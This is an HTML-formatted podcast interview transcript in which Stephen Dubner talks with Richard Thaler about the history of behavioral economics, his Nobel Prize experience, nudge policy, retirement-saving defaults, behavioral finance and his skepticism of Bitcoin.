&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, it really is too bad for you, because when you got done with me, you said, “I’m going over to the Economics Department to talk to this young guy&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Steven_Levitt&quot;&gt;&lt;em&gt;&lt;span&gt;Levitt&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;.” And then I think you abandoned the idea of writing a book with me, because sumo wrestlers are more important than mental accounting. But my recollection of the story was that I thought maybe I had a book in me. And eventually I did.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Obviously, you did. You had two more, and maybe more beyond.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: So, this is the tallest-midget theory, but by economists’ standards, I write well. And so yeah, I thought that maybe I should write a book. And that it should probably be in my voice. And it worked out well for all three of us.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I do agree you write well — not even for an economist. You’re a good writer, but in economics it especially stands out. I read a piece of yours recently that I would recommend to everybody. It was published in, I believe,&lt;/span&gt;&lt;/em&gt; &lt;span&gt;J.P.E. — Journal of Political Economy&lt;/span&gt; &lt;em&gt;&lt;span&gt;— and it was&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.journals.uchicago.edu/doi/full/10.1086/694640&quot;&gt;&lt;em&gt;&lt;span&gt;an essay about the history of behavioral economics&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;. And this was so interesting to me. You write that it nearly got fully underway at the University of Chicago about 100 years ago, but didn’t catch on. Can you talk a little bit about that?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, so the background is, the University of Chicago house journal, the&lt;/span&gt;&lt;/em&gt; &lt;span&gt;Journal of Political Economy&lt;/span&gt;&lt;em&gt;&lt;span&gt;, one of the top five journals in the world — they were celebrating their 125th anniversary, and they asked a bunch of Chicago faculty members to write short essays on their field and how it’s been represented in the journal. And for behavioral economics, there were pretty slim pickings. But there was this article written exactly 100 years ago in 1918 by a guy called&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/John_Maurice_Clark&quot;&gt;&lt;em&gt;&lt;span&gt;John Maurice Clark&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;. He was the son of a more famous guy,&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/John_Bates_Clark&quot;&gt;&lt;em&gt;&lt;span&gt;John Bates Clark&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, for whom an award is named. And he writes something like, the economist can try to invent his own psychology, but it will be bad psychology, and if they want to stick to economics, they should borrow their psychology from psychologists.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Clark, you write, ends up leaving Chicago for Columbia. And you write, “it seems fair to say that the subsequent editors of the&lt;/span&gt;&lt;/em&gt; &lt;span&gt;J.P.E.&lt;/span&gt; &lt;em&gt;&lt;span&gt;did not take up his call to arms,” which was essentially to integrate psychology and economics. Why did it take so long, do you think?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, I don’t know really what was going on in 1918, but it is the case that economics was behavioral.&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Adam_Smith&quot;&gt;&lt;em&gt;&lt;span&gt;Adam Smith&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;was a behavioral economist, for sure. And Keynes was a behavioral economist. The single best chapter on behavioral finance was written by&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/John_Maynard_Keynes&quot;&gt;&lt;em&gt;&lt;span&gt;John Maynard Keynes&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;in&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.amazon.com/gp/product/0156347113/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=freakonomic08-20&amp;amp;creative=9325&amp;amp;linkCode=as2&amp;amp;creativeASIN=0156347113&amp;amp;linkId=dd576c2ae0e9469ca05900d15f0fc665&quot;&gt;&lt;span&gt;The General Theory&lt;/span&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, which was written in 1936. So I think until World War II, there wasn’t something called “behavioral economics,” but economics was kind of behavioral.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;And then what happened is, there was a mathematical revolution that took place right after World War II. And it was led by people like&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Paul_Samuelson&quot;&gt;&lt;em&gt;&lt;span&gt;Paul Samuelson&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;and&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Kenneth_Arrow&quot;&gt;&lt;em&gt;&lt;span&gt;Kenneth Arrow&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;. And Samuelson in particular, he was a University of Chicago undergraduate, and then went off to graduate school, and his thesis was called&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.amazon.com/gp/product/0689701772/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=freakonomic08-20&amp;amp;creative=9325&amp;amp;linkCode=as2&amp;amp;creativeASIN=0689701772&amp;amp;linkId=a7ba932f5524c1afaeae33c7ca5de410&quot;&gt;&lt;span&gt;Foundations of Economic Analysis&lt;/span&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;. So all he did was redo all of economics properly.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;And so starting with that, economists got busy writing down Greek letters and formalizing economics. And it turns out the easiest way to do that is to describe behavior as some kind of optimization problem. Because if you’ve taken a high-school calculus class, then you know how to solve for the maximum: you take the first derivative and set it equal to zero, and you’re done. So it was the bounded rationality of economists, ironically, that led them to make everything rational.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: It’s interesting, because a lot of the hallmark anomalies identified in recent decades by people like you and Kahneman and Tversky — we talk about loss aversion and mental accounting, and the endowment effect; and all the cognitive biases: recency bias and status-quo bias, and the availability bias — it strikes me that none of them actually even seem remotely new.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Can’t you find most of them in Shakespeare? Can’t you find them in Roman and Greek and earlier philosophy? Don’t you find them in the Bible and other ancient texts? So if what you’re describing now is a kind of mid-century modern renaissance of a more holistic thinking about economics that was there from Adam Smith onward, until World War II — I guess the real question is, is that really worth a Nobel Prize, to have rediscovered this rich tradition of, “people say they want to do one thing, but often do another?”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: I think it’s the sort of thing that your mother might say, “Really? You make a living doing that?” Much less a Nobel Prize? So I guess it’s fair to say that just pointing out that people aren’t all that smart would not get you a Nobel Prize. You had to do something with it. And that turned out to be more work than I liked. But there was a long debate. And by no means have I convinced everyone.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Well, you were once asked about the degree to which, quote, “mainstream economists” have embraced behavioral economics. And you said, “I don’t think I’ve changed anyone’s mind in 40 years. You basically don’t change minds. Given that, I’ve turned to the strategy of corrupting the youth.” And indeed, there are a lot of young economists really interested in behavioral stuff. Is that really true? Did you really change no minds? And, if so — or even if not, I guess — what have you learned about the human capacity to change a mind? I mean, we don’t want to just write off anyone over the age of 25, do we, as incapable of entertaining new thoughts?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, it’s hard. So, I think&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Richard_Posner&quot;&gt;&lt;em&gt;&lt;span&gt;Richard Posner&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, the great judge, I think he’s changed his mind a bit. But I think it is hard to change people’s minds. But economists in graduate school now, they don’t have a big sunk cost in the traditional methods. There was an economist once early in my career who said to me, “You know, if you’re right, what am I supposed to do? What I know how to do is solve optimization problems.” And I said, “You know, really I don’t know. I’m sure you’ll think of something.”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: It’s interesting though, because if you look at the world writ large, political systems and healthcare institutions, and so on — isn’t that exactly the same core problem that we’re facing? Which is, people come along with what could be really useful solutions but, institutions being what they are, the people with the power to change have often the least incentive to change. Isn’t that a huge issue in the lack of progress?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, I get what you’re saying, which is, if I’m at the top of the heap, why do I need to change? But on the other hand, it’s often the C.E.O. that is the most reluctant to change, and that guy — and he’s unfortunately still usually a guy — potentially has a lot to gain from changing. If you think of companies that have come and gone, like Kodak, which invented the digital camera, but they had an almost-monopoly in film, and didn’t really think this digital thing would go anywhere. Blockbuster Video, which came along and put tens of thousands of mom-and-pop video stores out of business, only to be put out of business by Netflix.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;*      *      *&lt;/p&gt;
&lt;p&gt;&lt;span&gt;In December of 2017, Richard Thaler went to Stockholm for a multitude of Nobel festivities.&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;13.771428571429&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: At the Nobel Prize banquet, one winner from each prize has to give a toast. It gives you a glimpse of the grandeur.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;ANNOUNCER (TRANSLATED FROM SWEDISH): It is a great honor to introduce the laureate of the Sveriges Riksbank Prize in Economics in Memory of Alfred Nobel: Professor Richard Thaler.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: So&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=s6cruZhEB0o&quot;&gt;&lt;em&gt;&lt;span&gt;my toast&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;began by saying that my fellow winners had discovered things like gravitational waves, and circadian rhythms. And I discovered the existence of humans in the economy.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;Then there were other events, including the Nobel lecture.&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;424.93837123991&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://www.hhs.se/en/person/?personid=1981033&quot;&gt;&lt;em&gt;&lt;span&gt;Magnus JOHANNESSON&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;: Professor Thaler, please, the stage is yours.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Thanks to all the members of the committee. And thanks for that great introduction. So, I’ve been interested in gravitational waves for a long time—oh no!&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: In an earlier episode about the Nobel Prize and how to win one, we did speak with your colleague and our friend Steve Levitt, and he said:&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Steve LEVITT: [From “How to Win a Nobel Prize”] The way I know it’s Nobel season is that around Chicago, a lot of people tend to get haircuts in the few days leading up to the announcement of the prize. And so if I see all my colleagues with really short and well-maintained hair, I know that the prize must be somewhere right about the corner.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So we have a question here from a listener named Aaron Wicks. He writes to say, “Dear Professor Thaler, did you get a haircut in hopeful anticipation of receiving your Nobel Memorial Prize?”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: No, I didn’t. And I will also say that I have heard of economists and other scientists who set their alarm.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: And then do they practice sounding sleepy?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: — like 3:45 — so that they’ll be alert, which I was the opposite of when the phone rang. And I’m a good enough amateur psychologist to know that this is a horrible idea, a really dreadful idea. So, let’s suppose my chances of winning were one in 20. Setting my alarm gives me a 95 percent chance of being awake to get the bad news. Whereas my strategy had always been to sleep soundly and then hear on NPR in the morning or now, breaking news on your phone, “Oh, isn’t that nice that&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Jean_Tirole&quot;&gt;&lt;em&gt;&lt;span&gt;Jean Tirole&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, a fabulous fellow, won the Nobel Prize?” And you can be happy about that. So, no, I didn’t get a haircut, and my alarm was not set.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: In the very near aftermath of having been informed that you won the Nobel, you said this:&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER:&lt;/span&gt;&lt;/em&gt;&lt;em&gt; [At University of Chicago post-Nobel conference] &lt;/em&gt;&lt;em&gt;&lt;span&gt;And unlike&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Bob_Dylan&quot;&gt;&lt;em&gt;&lt;span&gt;Bob Dylan&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, I do plan to go to Stockholm.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: And you&lt;/span&gt;&lt;/em&gt; &lt;em&gt;&lt;span&gt;did&lt;/span&gt;&lt;/em&gt; &lt;em&gt;&lt;span&gt;go to Stockholm. Tell us about that experience …&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well it’s a week-long marathon. The laureates are there for eight days of constant interviews and dinners and talks and various things. And there’s a hierarchy in the Stockholm prizes. The Peace Prize is given by Norway, and is done in Oslo. And the hierarchy is: physics, chemistry, medicine, literature, economics. And so my line is that among sciences, the Swedes consider economics just after literature. And that’s because, of course, the economics prize, as we know, and as I’m sure some of your listeners will call in and inform, “You idiots, it’s not a real Nobel prize.”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Well, before you go on, let’s just get it straight. The Nobel Prize in economics is not what they call an original Nobel. It was established in 1968. It’s officially called the Central Bank of Sweden Prize in Economic Sciences in Memory of Alfred Nobel. But, as you point out, a small but vocal contingent always seeks to remind us of this fact whenever the economic prize is referred to as a Nobel Prize. What do you say to that small, vocal contingent that says, “Well, it’s not really a Nobel Prize?”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: You know, it’s a pretty good substitute. And I will say, the Nobel Foundation makes exactly no distinction. So, you’re all treated the same way. But, because of this order, I spent a lot of time standing in lines and sitting next to &lt;a href=&quot;https://en.wikipedia.org/wiki/Kazuo_Ishiguro&quot;&gt;Kazuo Ishiguro&lt;/a&gt;, the Literature winner, who was charming and wonderful.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;But I will say that I found the whole thing to be pretty emotional, partly because of where I came from intellectually. So, as we were saying, I’m not someone that you would have predicted would be a Nobel Prize winner. And when that finally happened, it was an emotional experience.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Are either of your parents still alive?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: No. They’re very slow.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: They, the Nobel Committee, you’re talking about.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, the Nobel committee — they’re working their way through the 1980’s. So that means that people are typically in their late 60’s and early 70’s when they win the Nobel Prize, which means there are very few parents that get to see their children win.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Who do you think was most proud of you?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Danny Kahneman. Well, he was happiest. He kept telling me, “Come on, win this before I die!” And he’s 84, and he’s a friend, so I had to do it. The bribes were finally well worth it.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So let’s move on to talking about how behavioral economics has been applied by various people in various intensities in many different places around the world. You’ve said there are roughly 75 what are called “Nudge units” named after your and &lt;a href=&quot;https://en.wikipedia.org/wiki/Cass_Sunstein&quot;&gt;Cass Sunstein&lt;/a&gt;’s book&lt;/span&gt;&lt;/em&gt; &lt;span&gt;Nudge&lt;/span&gt;&lt;em&gt;&lt;span&gt;, about using behavioral economics in policy, essentially. Policy-making.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: The latest number is 200.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Goodness gracious, that’s a tripling in what span of time, just a year or two?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: I don’t know, and I’m not the one keeping track, but someone at the O.E.C.D. has a map with 200. Some of these are in—&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Municipal governments.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Cities — there’s one in Chicago, for example.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Alright, but what would you say to date has been the greatest kind of specific contribution of behavioral economics? In other words, the greatest instance in which the research and the ideas have been applied to policy in successful measures?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: I guess you’d have to say retirement saving plans. Because 401(k) plans and their ilk — defined-contribution plans — have really been transformed because of behavioral-economics research, on two dimensions. One is changing the default, so what’s called automatic enrollment. So you’re in unless you actively take some step to opt out. That has gotten enrollment rates to be north of 90 percent. And then what my colleague&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;http://www.anderson.ucla.edu/faculty-and-research/behavioral-decision-making/faculty/benartzi&quot;&gt;&lt;em&gt;&lt;span&gt;Shlomo Benartzi&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;and I called “Save More Tomorrow,” which is a plan where you ask people if they want to increase their saving rates every year until they hit some reasonable level. The generic version of that is now called automatic escalation.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So what that means is, you get a raise and you contribute a higher percentage, but because you’re getting a raise, you still are bringing home a little bit more money and you don’t feel the pain, is that the idea?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Right. And you commit yourself to this off in the future, because we all have more self-control next month, when we’re going to start going to the gym every morning at 6:00.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: You’ve written that “the subfield of economics in which the behavioral approach has had the greatest impact is finance.” I’d love you to talk about that for a minute. One thing I’ve never understood about behavioral finance is: once the notion of behavioral anomalies is widely accepted — and they seemed to be, now, in finance and in investing — aren’t they just subsequently priced out of the market?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, that’s an interesting question. And the answer is, to some extent, yes. But I’ve been involved with a money-management firm, called Fuller and Thaler, that’s been around for 25 years or so. And the things we do don’t seem to work any less well than they did 20 years ago.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I know Fuller and Thaler describes itself as having “pioneered the application of behavioral finance to investment management.” In what ways is the firm’s strategy actually behavioral?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: So we’re explicitly thinking about, what are a class of situations in which people are likely to make a mistake? So it’s like, you go into some restaurant and somebody is leading you to your table, and there’s that one step down, and they say, “watch your step.” And they say that because if they don’t, three people a night will fall down, and they’ll have lawsuits. So, you can be a spectator watching that and say, “Oh, that guy’s about to make a mistake.” Now, you would have made that mistake, too. So, what we try to do is find those steps that are not quite in sight that will throw a majority of market participants off.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Let me ask you a related question. This is from Colm Ryan, who writes that he’s an accountant in Dublin, Ireland. Related to what we’ve been speaking about, with very high stakes, I should say. So here’s his question: “Given that you could apply behavioral principles to help understand what led to the 2007 crash, do you see any similarities, or, indeed, differences in what’s going on in the world today?” And before we let you answer the question, we should say that you, Richard Thaler, would seem particularly well-suited to answer this difficult question because in the film&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.amazon.com/gp/product/B01996A6AE/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=freakonomic08-20&amp;amp;creative=9325&amp;amp;linkCode=as2&amp;amp;creativeASIN=B01996A6AE&amp;amp;linkId=e071b23b9fc89a232c26ea295b4cf50a&quot;&gt;&lt;span&gt;The Big Short&lt;/span&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;,&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.selenagomez.com/&quot;&gt;&lt;em&gt;&lt;span&gt;Selena Gomez&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;helps you explain synthetic C.D.O.’s — collateralized debt obligations.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Ryan_Gosling&quot;&gt;&lt;em&gt;&lt;span&gt;Ryan GOSLING&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;: Well, here is Dr. Richard Thaler, father of behavioral economics, and Selena Gomez to explain:&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Selena GOMEZ: Okay, so here is how a synthetic C.D.O. works. Let’s say I bet $10 million on a blackjack hand.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: $10 million because this hand is meant to represent a single mortgage bond.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So first of all, was she a pretty good teacher? You understood C.D.O.’s better after that filming?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, let me just say that Selena, unlike me, was very good at memorizing lines. And I think it’s fair to say — she was a very charming young woman, and I’m deeply grateful to her because being in that movie is the only thing that I’ve done that has impressed my granddaughters, who are big Selena Gomez fans — but I think it’s fair to say, Selena knew nothing about collateralized debt obligations nor blackjack.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So she’s a great actress, then, because the impression is, she knows quite a bit about both.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, she’s much better actor than me. And so a possibly funny story is that in the script, the first hand, she’s dealt a 21, which of course in blackjack means you win. And she was dealt 21 and didn’t react. And so I had to take over as blackjack coach and director — both of which are uncredited in the movie, I might add — and say, “Selena, when you get dealt 21, that means you win.” And there’s a shot in there where we’re high five-ing, and that’s because she had learned in subsequent takes that when she gets dealt 21, that she’s supposed to be happy.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Okay, so let’s get back to Colm Ryan’s question about the 2007 meltdown and now — similarities? Differences? What do you see?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, I don’t think we will repeat that mistake. But that crisis followed pretty quickly after the tech crash in 2000. Right? And it started like in 2006. So we’re barely over the tech bubble, and we get this real-estate bubble. And we seem to learn one lesson and then are not able to extrapolate it to the next one. I don’t know what the next bubble will be, or whether we’re already in one. I do think that we have done some things to make banks less fragile, especially big ones. But, there are things like Bitcoin around —&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Of which you’re not a fan, we should say.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Of which I’m not a fan.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: You’re not not a fan of blockchain itself, correct? But as a currency, not a fan. Is that about right?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Correct. I don’t know why anyone engaged in strictly legal activities would want to use a currency that is so volatile. It’s just the opposite. Suppose you sell another book and the publisher offers you an advance in Bitcoin. Unless you were trying to cheat the I.R.S., you would say, “No, tell me what it’s going to be in dollars. Because I could end up getting half of what you’re offering me, and that’s not an attractive feature.”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So have you shorted Bitcoin?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: No, because Warren Buffett says a lot of smart things, and one of the things he says is, don’t make investments in things you don’t understand. And I have no clue. I don’t think that the intrinsic value of Bitcoin is worth thousands of dollars. But I also think it’s entirely possible that it will go up rather than down. So “stay away” is the best advice.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Some people, including some economists, argue that behavioral economics is really just another way to suggest that individuals can’t be trusted to make good decisions. And so institutions, particularly the state, should take more control. Indeed, your co-author on the book&lt;/span&gt;&lt;/em&gt; &lt;span&gt;Nudge&lt;/span&gt;&lt;em&gt;&lt;span&gt;, the legal scholar Cass Sunstein, for several years ran a White House unit called the Office of Information and Regulatory Affairs, which sounds about as Orwellian as you can. There are “Nudge units” in dozens of federal governments around the world. You’ve described your work as libertarian paternalism, and, furthermore, argued that that phrase is not an oxymoron. Why shouldn’t we dismiss your work as a kind of new, softer form of statism?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, first of all, when we use this phrase libertarian paternalism, we’re using libertarian as an adjective. And so we’re trying to say we’re going to design policies that don’t force anyone to do anything. So the claim that we’re trying to tell people what to do, or force them to do things, is just completely wrong. We are also not trying to tell them to do what we think is smart. We’re trying to help people do what they want to do.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;I like to use G.P.S. as an analogy of what we’re trying to do. So, I have a terrible sense of direction. And Google Maps is a lifesaver for me. Now, if I want to go visit you, I can plug in your address, and suppose I’m walking across the park, and I see, “Oh, there’s a softball game over there. I think I’ll go watch that for a while,” Google Maps doesn’t scold me. It will re-compute a new route if I’ve gone a bit out of my way. It doesn’t suggest addresses to me. It just suggests a route. And if there’s a traffic jam, it suggests maybe you should alter your route.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
